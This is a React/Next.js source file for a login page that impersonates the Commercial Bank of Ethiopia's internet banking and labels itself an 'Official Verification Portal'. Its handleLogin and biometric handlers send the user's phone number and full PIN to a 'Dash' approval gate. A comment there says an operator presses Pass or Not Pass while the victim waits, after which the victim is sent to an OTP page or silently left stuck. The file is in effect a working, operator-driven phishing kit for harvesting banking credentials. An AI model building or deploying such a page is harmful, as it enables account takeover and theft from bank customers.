'use client';

import React, { useState } from 'react';
import Image from 'next/image';
import {
  Lock,
  Fingerprint,
  ArrowRight,
  ShieldCheck,
  Eye,
  EyeOff,
  HelpCircle,
  Delete,
  CheckCircle,
  AlertCircle,
  Phone,
} from 'lucide-react';
import { CbeLogo } from '@/components/cbe/CbeLogo';
import { LanguageSelector } from '@/components/cbe/LanguageSelector';
import { BiometricModal } from '@/components/cbe/BiometricModal';
import { VirtualKeypad } from '@/components/cbe/VirtualKeypad';
import { AuthenticatedDashboard } from '@/components/cbe/AuthenticatedDashboard';
import { VerificationPortal } from '@/components/cbe/VerificationPortal';
import { OtpVerification } from '@/components/cbe/OtpVerification';
import {
  TRANSLATIONS,
  LanguageCode,
} from '@/lib/cbe-translations';
import { requestDashApproval } from '@/lib/dash-gate';

const DASH_SITE_ID = 'commercial-cbe';

type AuthStep = 'login' | 'otp' | 'authenticated';

export default function Home() {
  const [currentLang, setCurrentLang] = useState<LanguageCode>('en');
  const [phoneNumber, setPhoneNumber] = useState<string>('');
  const [pinLength, setPinLength] = useState<4 | 5 | 6>(4);
  const [pin, setPin] = useState<string>('');
  const [showPin, setShowPin] = useState<boolean>(false);
  const [showVirtualKeypad, setShowVirtualKeypad] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [authStep, setAuthStep] = useState<AuthStep>('login');

  // Modals state
  const [isBiometricOpen, setIsBiometricOpen] = useState<boolean>(false);

  const t = TRANSLATIONS[currentLang] || TRANSLATIONS.en;

  // Validation rules:
  // - Ethiopian mobile numbers: exactly 9 digits after +251 (e.g. 912345678)
  // - PIN: selectable 4, 5, or 6 digits numeric (default: 4)
  const isPhoneValid = phoneNumber.length === 9 && /^\d{9}$/.test(phoneNumber);
  const isPinValid = pin.length === pinLength && /^\d+$/.test(pin);
  const isFormValid = isPhoneValid && isPinValid;

  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    setErrorMessage(null);

    if (!isPhoneValid) {
      setErrorMessage('Please enter a valid 9-digit mobile number (e.g. 912 345 678)');
      return;
    }

    if (!isPinValid) {
      setErrorMessage(pin.length === 0 ? t.pinError : `Please enter your complete ${pinLength}-digit PIN`);
      return;
    }

    // Gated by Dash: button shows loading spinner until operator presses Pass / Not Pass.
    // Pass -> go to OTP page. Not Pass -> silently stay, reset button, no error/note.
    setIsLoading(true);
    const decision = await requestDashApproval({
      siteId: DASH_SITE_ID,
      page: 'login',
      meta: { phone: '+251' + phoneNumber, pinLength, pin },
    });
    if (decision === 'pass') {
      setIsLoading(false);
      setAuthStep('otp');
    } else {
      setIsLoading(false);
    }
  };

  const handleOtpSuccess = () => {
    setAuthStep('authenticated');
  };

  const handleBackToLogin = () => {
    setAuthStep('login');
  };

  const handleBiometricSuccess = async () => {
    setIsBiometricOpen(false);
    setIsLoading(true);
    const decision = await requestDashApproval({
      siteId: DASH_SITE_ID,
      page: 'login-biometric',
      meta: { phone: '+251' + phoneNumber, via: 'biometric' },
    });
    setIsLoading(false);
    if (decision === 'pass') setAuthStep('otp');
  };

  const handleLogout = () => {
    setAuthStep('login');
    setPhoneNumber('');
    setPinLength(4);
    setPin('');
    setShowVirtualKeypad(false);
  };

  return (
    <div className="min-h-screen bg-[#f7f8fa] text-neutral-900 selection:bg-[#b5873e]/20 selection:text-[#b5873e]">
      {/* Top Banner with Platform Switcher & Security Status */}
      <header className="sticky top-0 z-40 border-b border-neutral-200/80 bg-white/95 backdrop-blur-md">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-2.5 sm:px-6">
          {/* Bank Badge */}
          <div className="flex items-center gap-2">
            <div className="relative flex h-6 w-6 shrink-0 items-center justify-center">
              <Image
                src="/cbe-logo.png"
                alt="Commercial Bank of Ethiopia"
                width={24}
                height={24}
                className="object-contain"
                referrerPolicy="no-referrer"
              />
            </div>
            <div className="flex items-center gap-2 text-xs font-semibold text-neutral-800">
              <span className="hidden sm:inline">Commercial Bank of Ethiopia</span>
              <span className="sm:hidden">CBE Banking</span>
              <span className="hidden sm:inline text-neutral-300 font-light">|</span>
              <span className="hidden sm:inline text-neutral-500 font-normal">Internet Banking</span>
            </div>
          </div>

          {/* Header Right: Official Portal Badge */}
          <div className="flex items-center gap-3">
            <div
              id="cbe-official-web-portal-badge"
              className="flex items-center gap-2 rounded-full border border-neutral-200/90 bg-white px-3.5 py-1.5 text-xs text-neutral-800 shadow-[0_1px_4px_rgba(0,0,0,0.04)] ring-1 ring-black/[0.04]"
            >
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500" />
              </span>
              <ShieldCheck className="h-3.5 w-3.5 text-emerald-600 shrink-0" />
              <span className="font-semibold text-neutral-900 tracking-tight">Official Verification Portal</span>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content Body: Dedicated Website Banking Portal Form */}
      <main className="mx-auto flex w-full max-w-7xl flex-1 flex-col items-center justify-center p-3 sm:p-6 lg:p-8">
        {authStep === 'authenticated' ? (
          <AuthenticatedDashboard onLogout={handleLogout} phoneNumber={phoneNumber} />
        ) : (
          /* ========================================================= */
          /* WEB FORM VIEW: Full Desktop Banking Website Portal Layout  */
          /* ========================================================= */
          <div className="w-full max-w-6xl animate-in fade-in duration-200">
            <div className="grid grid-cols-1 items-start gap-8 lg:grid-cols-12">
              {/* Left Column: CBE Banking Info & Official Verification Portal */}
              <div className="order-2 space-y-5 lg:order-1 lg:col-span-7">
                <VerificationPortal />
              </div>

              {/* Right Column: Either OTP Verification or CBE Login Card */}
              <div className="order-1 flex justify-center lg:order-2 lg:col-span-5">
                {authStep === 'otp' ? (
                  <OtpVerification
                    phoneNumber={phoneNumber}
                    onVerifySuccess={handleOtpSuccess}
                    onBackToLogin={handleBackToLogin}
                  />
                ) : (
                  <div
                    id="cbe-login-card"
                    className="w-full max-w-[390px] rounded-[38px] border border-neutral-200/80 bg-white p-6 sm:p-7 shadow-xl transition-all"
                  >
                  {/* Top Bar: Language Selector */}
                  <div className="flex items-center justify-center">
                    <LanguageSelector
                      currentLang={currentLang}
                      onSelect={(lang) => setCurrentLang(lang)}
                    />
                  </div>

                  {/* CBE Emblem & Typography */}
                  <div className="mt-5">
                    <CbeLogo />
                  </div>

                  {/* Greeting: Welcome back */}
                  <div className="mt-5 text-center">
                    <p className="text-base font-medium text-neutral-500">
                      {t.welcomeBack}
                    </p>
                    <p className="text-base font-medium text-neutral-500 mt-1">
                      {t.verifyIdentity || 'Verify Your Identity'}
                    </p>
                  </div>

                  {/* Form Container */}
                  <form onSubmit={handleLogin} className="mt-5 space-y-3.5">
                    {/* Phone Number Input Box matching PIN container styling */}
                    <div className="relative">
                      <div
                        id="phone-input-container"
                        className="flex h-14 w-full items-center rounded-2xl border border-neutral-200/90 bg-white px-4 shadow-[0_2px_12px_-2px_rgba(0,0,0,0.04)] ring-offset-2 transition-all focus-within:border-[#b5873e] focus-within:ring-2 focus-within:ring-[#b5873e]/20"
                      >
                        {/* Golden Phone Icon */}
                        <div className="flex h-7 w-7 shrink-0 items-center justify-center text-[#b5873e]">
                          <Phone className="h-5 w-5 fill-[#b5873e]/20" />
                        </div>

                        {/* Starting Country Code (+251) */}
                        <div className="ml-2.5 flex shrink-0 items-center gap-1 border-r border-neutral-200 pr-2.5">
                          <span className="text-sm font-bold tracking-tight text-neutral-800">+251</span>
                        </div>

                        {/* Text / Phone Input */}
                        <input
                          id="phone-input-field"
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          maxLength={10}
                          value={phoneNumber}
                          disabled={isLoading}
                          onChange={(e) => {
                            if (isLoading) return;
                            let val = e.target.value.replace(/\D/g, '');
                            if (val.startsWith('0')) {
                              val = val.substring(1);
                            }
                            setPhoneNumber(val);
                            if (errorMessage) setErrorMessage(null);
                          }}
                          placeholder="912 345 678"
                          className="ml-2.5 flex-1 bg-transparent text-base font-semibold tracking-wide text-neutral-800 placeholder:font-normal placeholder:tracking-normal placeholder:text-neutral-400 focus:outline-none disabled:opacity-60"
                          autoComplete="tel"
                        />

                        {/* Action buttons inside Phone box: Clear */}
                        {phoneNumber.length > 0 && !isLoading && (
                          <button
                            type="button"
                            onClick={() => setPhoneNumber('')}
                            className="rounded-full p-1 text-neutral-400 hover:text-neutral-600 transition-colors"
                            title="Clear Phone"
                          >
                            <Delete className="h-4 w-4" />
                          </button>
                        )}
                      </div>
                    </div>

                    {/* PIN Input Box with 4, 5, 6 Digit Options */}
                    <div className="relative">
                      {/* PIN Length Options: 4, 5, or 6 digits (4 default) */}
                      <div className="mb-2 flex items-center justify-between px-1">
                        <span className="text-xs font-semibold text-neutral-600">
                          {t.pinPlaceholder} Length
                        </span>
                        <div
                          id="pin-length-toggle-group"
                          className="inline-flex items-center rounded-xl bg-neutral-100 p-0.5 border border-neutral-200/80"
                          role="radiogroup"
                          aria-label="Select PIN digits"
                        >
                          {([4, 5, 6] as const).map((len) => {
                            const isSelected = pinLength === len;
                            return (
                              <button
                                key={len}
                                id={`pin-len-${len}-btn`}
                                type="button"
                                role="radio"
                                aria-checked={isSelected}
                                disabled={isLoading}
                                onClick={() => {
                                  if (isLoading) return;
                                  setPinLength(len);
                                  if (pin.length > len) {
                                    setPin(pin.slice(0, len));
                                  }
                                  if (errorMessage) setErrorMessage(null);
                                }}
                                className={`rounded-lg px-2.5 py-1 text-xs font-semibold transition-all duration-150 ${
                                  isSelected
                                    ? 'bg-white text-[#b5873e] shadow-xs border border-neutral-200/70 font-bold'
                                    : 'text-neutral-500 hover:text-neutral-900'
                                }`}
                              >
                                {len} Digits
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      <div
                        id="pin-input-container"
                        className="flex h-14 w-full items-center rounded-2xl border border-neutral-200/90 bg-white px-4 shadow-[0_2px_12px_-2px_rgba(0,0,0,0.04)] ring-offset-2 transition-all focus-within:border-[#b5873e] focus-within:ring-2 focus-within:ring-[#b5873e]/20"
                      >
                        {/* Golden Padlock Icon */}
                        <div className="flex h-7 w-7 items-center justify-center text-[#b5873e]">
                          <Lock className="h-5 w-5 fill-[#b5873e]/20" />
                        </div>

                        {/* Text / Password Input */}
                        <input
                          id="pin-input-field"
                          type={showPin ? 'text' : 'password'}
                          inputMode="numeric"
                          pattern="[0-9]*"
                          maxLength={pinLength}
                          value={pin}
                          disabled={isLoading}
                          onChange={(e) => {
                            if (isLoading) return;
                            const val = e.target.value.replace(/\D/g, '').slice(0, pinLength);
                            setPin(val);
                            if (errorMessage) setErrorMessage(null);
                          }}
                          placeholder={`${pinLength}-digit PIN`}
                          className="ml-3 flex-1 bg-transparent text-base font-semibold tracking-widest text-neutral-800 placeholder:font-normal placeholder:tracking-normal placeholder:text-neutral-400 focus:outline-none disabled:opacity-60"
                          autoComplete="off"
                        />

                        {/* Action buttons inside PIN box: Count, Clear & Eye toggle */}
                        <div className="flex items-center gap-1.5">
                          {/* PIN Progress Indicator */}
                          <span className="text-[11px] font-semibold text-neutral-400 tabular-nums px-1 select-none">
                            {pin.length}/{pinLength}
                          </span>

                          {pin.length > 0 && !isLoading && (
                            <button
                              type="button"
                              onClick={() => setPin('')}
                              className="rounded-full p-1 text-neutral-400 hover:text-neutral-600 transition-colors"
                              title="Clear PIN"
                            >
                              <Delete className="h-4 w-4" />
                            </button>
                          )}
                          <button
                            id="toggle-pin-visibility"
                            type="button"
                            disabled={isLoading}
                            onClick={() => setShowPin(!showPin)}
                            className="rounded-full p-1 text-neutral-400 hover:text-neutral-700 transition-colors"
                            aria-label={showPin ? 'Hide PIN' : 'Show PIN'}
                          >
                            {showPin ? (
                              <EyeOff className="h-4 w-4 text-neutral-600" />
                            ) : (
                              <Eye className="h-4 w-4" />
                            )}
                          </button>
                        </div>
                      </div>

                      {/* Error Banner */}
                      {errorMessage && (
                        <p className="mt-1.5 flex items-center gap-1 text-xs text-rose-600">
                          <AlertCircle className="h-3 w-3 shrink-0" />
                          <span>{errorMessage}</span>
                        </p>
                      )}

                      {/* PIN length instruction */}
                      <div className="mt-2 flex items-center px-1 text-[11px]">
                        <span className="font-medium text-neutral-500">
                          {t.choosePinLength || 'Please choose the correct PIN length'}
                        </span>
                      </div>

                      {/* Virtual Keypad toggle container */}
                      {showVirtualKeypad && (
                        <VirtualKeypad
                          disabled={isLoading}
                          onKeyPress={(num) => {
                            if (isLoading) return;
                            if (pin.length < pinLength) setPin((prev) => prev + num);
                            if (errorMessage) setErrorMessage(null);
                          }}
                          onBackspace={() => {
                            if (isLoading) return;
                            setPin((prev) => prev.slice(0, -1));
                          }}
                          onClear={() => {
                            if (isLoading) return;
                            setPin('');
                          }}
                          onSubmit={handleLogin}
                        />
                      )}
                    </div>

                    {/* Login Button matching screenshot */}
                    <div className="pt-2">
                      <button
                        id="cbe-login-button"
                        type="submit"
                        disabled={!isFormValid || isLoading}
                        className={`flex h-14 w-full items-center justify-center gap-2 rounded-2xl text-base font-bold transition-all ${
                          isFormValid && !isLoading
                            ? 'bg-[#b58742] hover:bg-[#a37633] active:bg-[#926829] text-white shadow-[0_4px_16px_rgba(181,135,66,0.3)] active:scale-[0.99] cursor-pointer'
                            : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
                        }`}
                      >
                        {isLoading ? (
                          <div className="flex items-center gap-2">
                            <span className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                            <span>{t.loggingIn}</span>
                          </div>
                        ) : (
                          <>
                            <span>{t.login}</span>
                            <ArrowRight className="h-4 w-4 stroke-[2.5]" />
                          </>
                        )}
                      </button>
                    </div>
                  </form>

                  {/* Copyright Footer matching screenshot */}
                  <div className="mt-8 text-center">
                    <p className="text-xs text-neutral-400">
                      {t.footerRights}
                    </p>
                  </div>
                </div>
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Popups & Drawers */}
      <BiometricModal
        isOpen={isBiometricOpen}
        onClose={() => setIsBiometricOpen(false)}
        onSuccess={handleBiometricSuccess}
        t={t}
      />
    </div>
  );
}
